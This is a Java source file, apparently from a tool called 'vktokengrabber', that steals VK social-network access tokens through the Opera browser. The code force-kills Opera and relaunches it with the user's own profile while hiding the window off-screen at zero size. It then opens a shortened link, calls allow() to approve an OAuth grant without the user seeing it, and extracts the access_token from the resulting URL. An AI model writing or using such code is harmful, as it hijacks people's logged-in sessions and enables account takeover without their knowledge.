package com.github.dedinc.vktokengrabber.browsers;

import java.io.File;

import org.openqa.selenium.Dimension;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.Point;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.remote.DesiredCapabilities;

import com.github.dedinc.vktokengrabber.utils.WebDriver;

public class Opera {	

	public static String grabToken() {
		String username = System.getenv("USERNAME");
		if (!new File("C:\\Users\\" + username + "\\operadriver_win32\\operadriver.exe").exists()) {
			WebDriver.getOperaDriver();
		}
		System.setProperty("webdriver.chrome.driver", "C:\\Users\\" + username + "\\operadriver_win32\\operadriver.exe");
		try {
			Runtime.getRuntime().exec("taskkill /im opera.exe /f");
		} catch (Exception e) {
		}
		ChromeOptions options = new ChromeOptions();	
		options.addArguments("user-data-dir=C:\\Users\\" + username + "\\AppData\\Roaming\\Opera Software\\Opera Stable");
		options.setBinary("C:\\Users\\" + username + "\\AppData\\Local\\Programs\\Opera\\launcher.exe");
		new DesiredCapabilities();
		DesiredCapabilities capabilities = DesiredCapabilities.opera();
		capabilities.setCapability(ChromeOptions.CAPABILITY, options);
		ChromeDriver driver = new ChromeDriver(capabilities);
		driver.manage().window().setPosition(new Point(99999, 99999));
		driver.manage().window().setSize(new Dimension(0, 0));
		driver.get("https://vk.cc/9Y1vwX");
		JavascriptExecutor js = (JavascriptExecutor) driver;  
		if (driver instanceof JavascriptExecutor) {
			js.executeScript("allow()");
		}
		String url = driver.getCurrentUrl();		
		driver.quit();
		try {
			return "Token: " + url.split("access_token=")[1].split("&")[0];
		} catch (Exception e ) {
		}
		return null;
	}
}